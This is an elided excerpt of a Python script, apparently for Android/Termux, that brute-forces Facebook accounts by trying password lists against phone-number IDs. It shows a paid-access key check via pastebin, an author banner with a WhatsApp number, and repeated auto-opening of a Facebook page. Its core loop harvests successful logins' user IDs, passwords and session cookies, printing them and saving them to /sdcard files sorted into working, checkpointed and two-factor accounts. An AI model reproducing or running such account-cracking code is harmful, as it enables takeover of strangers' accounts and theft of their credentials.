...
os.system('am start https://www.facebook.com/rishitas.friend')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/rishitas.friend&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/qGh1aJmB").text
   ...
   if id in ses:
   	...
   	print('يﻭﺎﻬﺒﺳ دﺎﻬﺠﺑ ﻪﺻﺎﺧ تﺎﻛﺍﺮﺘﺷﺍ تﺍﺩﺍ')
   	
   	print('يﻭﺎﻬﺒﺴﻟﺍ دﺎﻬﺟ ﻲﺑ ﻪﺻﺎﺧ تﺍﺩﺍ')
...
print('دﺎﻬﺟ لﻭﺆﺴﻣ ﻞﺒﻗ ﻦﻣ تﺍﺩﻻﺍ ﻞﻴﻌﻔﺗ ﻢﺗ')
...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/rishitas.friend/?ref=share')
os.system('xdg-open https://www.facebook.com/rishitas.friend/?ref=share')
...
╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝
                              ...
                              يﻭﺎﻬﺒﺴﻟﺍ دﺎﻬﺟ ﻲﺑ ﻪﺻﺎﺧ تﺍﺩﺍ   

  AUTHOR   :   Jihad Al Sabhawi
  FACEBOOK :   Jihad Al Sabhawi
  LIFE STATUS  : Jihad Al Sabhawi
  FB GROUP  : Jihad Al Sabhawi 001
   WHATSAPP : 0920051652     
\033[1;91m=========================================================="""
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  J I H A D   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  J I H A D   \033[0;m]")
    print(f"")
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[J I H A D-OK😁🫶🏻]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/J I H A D-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[J I H A D-CP😥🤦🏻‍♂️]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/J I H A D-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/J I H A D-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[J I H A D ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
